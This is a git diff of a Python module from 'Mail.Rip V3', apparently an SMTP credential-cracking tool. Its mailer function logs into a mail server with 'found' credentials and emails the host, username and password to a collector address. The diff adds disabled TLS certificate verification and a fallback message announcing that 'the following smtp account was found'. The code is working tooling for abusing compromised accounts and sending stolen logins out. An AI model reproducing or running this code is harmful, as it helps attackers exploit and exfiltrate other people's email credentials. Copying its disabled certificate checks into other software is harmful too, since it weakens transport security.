@@ -2,8 +2,8 @@
 # -*- coding: utf-8 -*-
 
 __author__ = 'DrPython3'
-__date__ = '2021-11-23'
-__version__ = '2.2'
+__date__ = '2021-12-04'
+__version__ = '2.5'
 __contact__ = 'https://github.com/DrPython3'
 
 '''
@@ -11,7 +11,7 @@ __contact__ = 'https://github.com/DrPython3'
 Functions for Sending Test Messages with found SMTP Logins
 ----------------------------------------------------------
 
-Part of << Mail.Rip V3 >>
+Part of << Mail.Rip V3: https://github.com/DrPython3/MailRipV3 >>
 '''
 
 # [IMPORTS]
@@ -41,26 +41,58 @@ def mailer(default_email, target_email, target_host, target_port, target_user, t
     :return: True (email sent), False (no email sent)
     '''
     try:
+        # set variables and stuff:
         sslcontext = ssl.create_default_context()
-        with open('inc_emailcontent.json') as included_imports:
-            json_object = json.load(included_imports)
-            email_titles = (json_object['email_titles'])
-            email_firstlines = (json_object['email_firstlines'])
-            email_secondlines = (json_object['email_secondlines'])
-            email_thirdlines = (json_object['email_thirdlines'])
+        try:
+            sslcontext.check_hostname = False
+            sslcontext.verify_mode = ssl.CERT_NONE
+        except:
+            pass
+        content_loaded = False
+        try:
+            with open('inc_emailcontent.json') as included_imports:
+                json_object = json.load(included_imports)
+                email_titles = (json_object['email_titles'])
+                email_firstlines = (json_object['email_firstlines'])
+                email_secondlines = (json_object['email_secondlines'])
+                email_thirdlines = (json_object['email_thirdlines'])
+            content_loaded = True
+        except:
+            email_titles = []
+            email_firstlines = []
+            email_secondlines = []
+            email_thirdlines = []
+        # generate random id:
         random_id = str(uuid.uuid4().hex)[0:6].upper()
-        letter_subject = str(
-            email_titles[randint(0, len(email_titles) - 1)] + random_id
-        )
-        letter_firstline = str(
-            email_firstlines[randint(0, len(email_firstlines) - 1)]
-        )
-        letter_secondline= str(
-            email_secondlines[randint(0, len(email_secondlines) - 1)]
-        )
-        letter_thirdline = str(
-            email_thirdlines[randint(0, len(email_thirdlines) - 1)]
-        )
+        # generate parts of the message using the libraries:
+        if content_loaded == True:
+            letter_subject = str(
+                email_titles[randint(0, len(email_titles) - 1)] + random_id
+            )
+            letter_firstline = str(
+                email_firstlines[randint(0, len(email_firstlines) - 1)]
+            )
+            letter_secondline= str(
+                email_secondlines[randint(0, len(email_secondlines) - 1)]
+            )
+            letter_thirdline = str(
+                email_thirdlines[randint(0, len(email_thirdlines) - 1)]
+            )
+        # if previous step fails, this fallback is used:
+        else:
+            letter_subject = str(
+                f'Test Message ID{random_id}'
+            )
+            letter_firstline = str(
+                'thank you for using mailrip by drpython3.'
+            )
+            letter_secondline = str(
+                'the following smtp account was found.'
+            )
+            letter_thirdline = str(
+                'this hit has been saved to the results dir, too.'
+            )
+        # generate the testmessage:
         message = str(
             letter_firstline + '\n'
             + letter_secondline + '\n'
@@ -70,11 +102,13 @@ def mailer(default_email, target_email, target_host, target_port, target_user, t
             + f'password: {target_password}\n'
             + letter_thirdline + '\n'
         )
+        # pack the testmessage:
         letter = EmailMessage()
         letter.set_content(message)
         letter['Subject'] = str(f'{letter_subject}')
         letter['From'] = str(f'{target_email}')
         letter['To'] = str(f'{default_email}')
+        # connect to smtp server:
         if target_port == 465:
             mailer = smtplib.SMTP_SSL(
                 host=target_host,
@@ -91,7 +125,9 @@ def mailer(default_email, target_email, target_host, target_port, target_user, t
             )
             mailer.ehlo()
             try:
-                mailer.starttls(context=sslcontext)
+                mailer.starttls(
+                    context=sslcontext
+                )
                 mailer.ehlo()
             except:
                 pass
@@ -99,6 +135,7 @@ def mailer(default_email, target_email, target_host, target_port, target_user, t
             user=target_user,
             password=target_password
         )
+        # send email and quit:
         mailer.send_message(letter)
         mailer.quit()
         return True
